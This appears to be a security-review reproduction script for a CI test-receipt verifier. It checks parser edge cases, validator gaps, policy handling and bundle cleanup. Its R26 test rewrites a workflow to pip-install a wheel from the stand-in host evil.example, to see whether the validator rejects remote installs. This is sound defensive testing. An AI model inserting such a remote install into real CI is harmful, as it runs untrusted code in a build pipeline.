"""T013 repro part 5: R28 bundle half, R26, R22, R11 explicit_sha, R12 dirty-before,
R13 overflow, R17 cleanup, R6c escapes, lcov giant int, P2-02, static greps."""
import hashlib, json, shutil, subprocess, sys, os
from pathlib import Path
ROOT = Path("/home/hatch/workspace/p027-benchreceipt")
SRC = ROOT / "02_source"
sys.path.insert(0, str(SRC / "src"))
FIX = SRC / "fixtures" / "s0" / "n02-two-job-pr-head"
WORK = Path("/tmp/t013-repro/work5")
shutil.rmtree(WORK, ignore_errors=True); WORK.mkdir(parents=True)
from benchreceipt.policy import load_policy  # noqa: E402
from benchreceipt.verify import evaluate  # noqa: E402
from benchreceipt.bundle import build_bundle, verify_bundle, _check_receipt_reports  # noqa: E402
from benchreceipt.reports.lcov import parse_lcov, LcovError  # noqa: E402

def base_evidence(dst, jobs=("unit-linux-py312",)):
    shutil.copytree(FIX / "evidence", dst)
    for d in list(dst.iterdir()):
        if d.name not in jobs: shutil.rmtree(d)
    policy = load_policy(FIX / "policy.toml")
    policy["required_jobs"] = list(jobs)
    sha = json.loads((FIX / "expected.json").read_text())["expected_source_sha"]
    return policy, sha

print("== R28b bundle vs verify on './' report path ==")
ev = WORK / "r28-ev"; pol, sha = base_evidence(ev)
jd = ev / "unit-linux-py312"
rec = json.loads((jd / "receipt.json").read_text())
rec["reports"][0]["path"] = "artifacts/./junit.xml"
(jd / "receipt.json").write_text(json.dumps(rec, indent=2, sort_keys=True) + "\n", encoding="utf-8")
print("R28b verify.py ->", evaluate(pol, sha, ev)["status"])
out = WORK / "r28-bundle"; build_bundle(ev, out)
probs = []
_check_receipt_reports(out, out / "unit-linux-py312", "unit-linux-py312/receipt.json", probs)
print("R28b bundle _check_receipt_reports ->", [(p.code, p.path) for p in probs])
print("R28b verify_bundle whole ->", verify_bundle(out).ok,
      [p["code"] for p in verify_bundle(out).problems])

print("== R26 workflow validator accepts remote .whl ==")
sys.path.insert(0, str(SRC / "scripts"))
from validate_workflow_example import validate_workflow_text  # noqa: E402
ci = (SRC / "examples" / "github-actions" / "ci.yml").read_text()
evil = ci.replace("python -m pip install --no-build-isolation ./vendor/benchreceipt",
                  "python -m pip install https://evil.example/x.whl", 1)
errs = validate_workflow_text(evil, ["unit-linux-py312", "unit-linux-py313", "unit-windows-py312", "unit-windows-py313"])
print("R26 remote https .whl pip install -> errors:", errs if errs else "NONE (validator passes a remote wheel)")

print("== R22 P2-04 bare CR in LCOV SF preserved (as documented) ==")
try:
    out = parse_lcov(b"TN:\nSF:src/foo\rbar.py\nDA:1,1\nLF:1\nLH:1\nend_of_record\n")
    print("R22 bare CR in SF -> parsed, source_file =", repr(out["records"][0]["source_file"]), "(P2-04 as documented)")
except Exception as e:
    print("R22 bare CR in SF ->", type(e).__name__, str(e)[:100])

print("== R9b lcov giant int ==")
huge_lcov = b"TN:\nSF:src/foo.py\nDA:" + b"9" * 5000 + b",1\nLF:1\nLH:1\nend_of_record\n"
try:
    print("R9b parse_lcov huge DA line ->", parse_lcov(huge_lcov))
except LcovError as e:
    print("R9b parse_lcov huge DA -> LcovError (clean):", str(e)[:80])
except ValueError as e:
    print("R9b parse_lcov huge DA -> ValueError LEAKS (not LcovError):", type(e).__name__, str(e)[:80])

print("== R6c oracle TOML string escapes ==")
pp = WORK / "r6c-pol"; pp.mkdir(parents=True, exist_ok=True)
txt = (FIX / "policy.toml").read_text().replace('expected_workflow = "CI"', 'expected_workflow = "CI\\"X"', 1)
(pp / "policy.toml").write_text(txt, encoding="utf-8")
from benchreceipt.policy import load_policy as lp
try:
    print("R6c escaped quote: PY workflow =", repr(lp(pp / "policy.toml")["expected_workflow"]))
except Exception as e:
    print("R6c escaped quote: PY rejects:", type(e).__name__, str(e)[:100])
p = subprocess.run(["node", "-e",
    "import('./oracle/verify.mjs').then(m=>{console.log(JSON.stringify(m.parsePolicyToml(require('fs').readFileSync(process.argv[1],'utf-8')).expected_workflow))})",
    str(pp / "policy.toml")], capture_output=True, text=True, cwd=str(SRC), timeout=30)
print("R6c escaped quote: ORA workflow =", p.stdout.strip(), p.stderr.strip()[:120])

print("== R11 explicit_sha unreachable from capture ==")
import tempfile
from benchreceipt.capture import capture as do_capture  # noqa: E402
tmp = Path(tempfile.mkdtemp(prefix="t013-r11-", dir="/tmp/t013-repro"))
repo = tmp / "repo"; repo.mkdir()
def run(cmd, cwd):
    subprocess.run(cmd, cwd=cwd, check=True, capture_output=True, text=True)
run(["git", "init", "-q", "-b", "main"], repo)
run(["git", "config", "user.email", "r11@example.invalid"], repo)
run(["git", "config", "user.name", "r11"], repo)
(repo / "test_x.py").write_text("def test_ok():\n    assert True\n", encoding="utf-8")
(repo / ".gitignore").write_text(".benchreceipt/\n__pycache__/\n.pytest_cache/\n", encoding="utf-8")
run(["git", "add", "."], repo); run(["git", "commit", "-qm", "x"], repo)
head = subprocess.run(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True, check=True).stdout.strip()
res = do_capture(job_id="unit-linux-py312", matrix={"os": "ubuntu-latest", "python": "3.12"},
                 argv=[sys.executable, "-m", "pytest", "-q", "-p", "no:cacheprovider",
                       "--junitxml=.benchreceipt/out/junit.xml", "test_x.py"],
                 junit_path=".benchreceipt/out/junit.xml", repo_path=repo, cwd=repo)
print("R11 real local capture source_mode =", res.receipt["git"]["source_mode"],
      "expected_source_sha =", res.receipt["git"]["expected_source_sha"][:12] + "...")
pol_text = ('schema_version = 1\nsource_mode = "explicit_sha"\nexpected_workflow = "local"\n'
            'required_jobs = [ "unit-linux-py312" ]\nmin_tests = 1\nrequire_clean_source_after = true\n'
            "same_tree_across_jobs = true\nsame_run_id = false\nsame_run_attempt = false\n\n[reports]\n"
            'junit = "required"\nlcov = "optional"\n\n[security]\nstore_stdout = false\nstore_stderr = false\nstore_full_environment = false\n')
(repo / ".benchreceipt.toml").write_text(pol_text, encoding="utf-8")
pol = lp(repo / ".benchreceipt.toml")
v = evaluate(pol, head, repo / ".benchreceipt" / "evidence")
print(f"R11 verify capture receipt vs explicit_sha policy -> {v['status']} {sorted(v['reason_codes'])}")

print("== R12 dirty-before with require_clean_source_after=false ==")
ev = WORK / "r12"; pol, sha = base_evidence(ev)
pol["require_clean_source_after"] = False
jd = ev / "unit-linux-py312"
rec = json.loads((jd / "receipt.json").read_text())
rec["git"]["dirty_before"] = True; rec["git"]["dirty_after"] = True
rec["source_state_before"] = {"dirty": True, "tracked_diff_sha256": hashlib.sha256(b"M  src/a.py\n").hexdigest()}
rec["source_state_after"] = {"dirty": True, "tracked_diff_sha256": hashlib.sha256(b"M  src/a.py\n").hexdigest()}
(jd / "receipt.json").write_text(json.dumps(rec, indent=2, sort_keys=True) + "\n", encoding="utf-8")
v = evaluate(pol, sha, ev)
print(f"R12 dirty before+after, same digest, require_clean_after=false -> {v['status']} {sorted(v['reason_codes'])} jobs={v['jobs_verified']}")

print("== R13 result overflow: 130 invalid job dirs ==")
ev = WORK / "r13"; pol, sha = base_evidence(ev)
for i in range(130):
    d = ev / f"extra-job-{i:03d}"; d.mkdir(parents=True, exist_ok=True)
    (d / "receipt.json").write_text("{not json", encoding="utf-8")
v = evaluate(pol, sha, ev)
print(f"R13 130 invalid receipts -> {v['status']} {sorted(v['reason_codes'])} report_errors={len(v['report_errors'])}")
print("R13 report_errors codes sample:", sorted({e['code'] for e in v['report_errors']}))

print("== R17 build_bundle cleanup only on BundleError ==")
from unittest import mock
ev = WORK / "r17-ev"; pol, sha = base_evidence(ev)
out = WORK / "r17-bundle"
import benchreceipt.bundle as B
real_copy = B.shutil.copyfile
def boom(src, dst, **kw):
    if "receipt.json" in str(dst):
        raise OSError("simulated disk failure")
    return real_copy(src, dst, **kw)
try:
    with mock.patch.object(B.shutil, "copyfile", boom):
        B.build_bundle(ev, out)
    print("R17 build with copy OSError -> no exception (unexpected)")
except OSError as e:
    left = out.exists() and any(out.iterdir())
    print(f"R17 build with copy OSError -> OSError propagates; half-written out_dir left behind: {left}")
except Exception as e:
    print("R17 ->", type(e).__name__, str(e)[:100])

print("== P2-02 whitespace-padded 2MB receipt still BOUND_PASS (as documented) ==")
ev = WORK / "r-p202"; pol, sha = base_evidence(ev)
jd = ev / "unit-linux-py312"
raw = (jd / "receipt.json").read_text()
padded = raw[:-2] + " " * (2 * 1024 * 1024) + raw[-2:]
(jd / "receipt.json").write_text(padded, encoding="utf-8")
v = evaluate(pol, sha, ev)
print(f"P2-02 2MB padded receipt -> {v['status']} (as documented)")
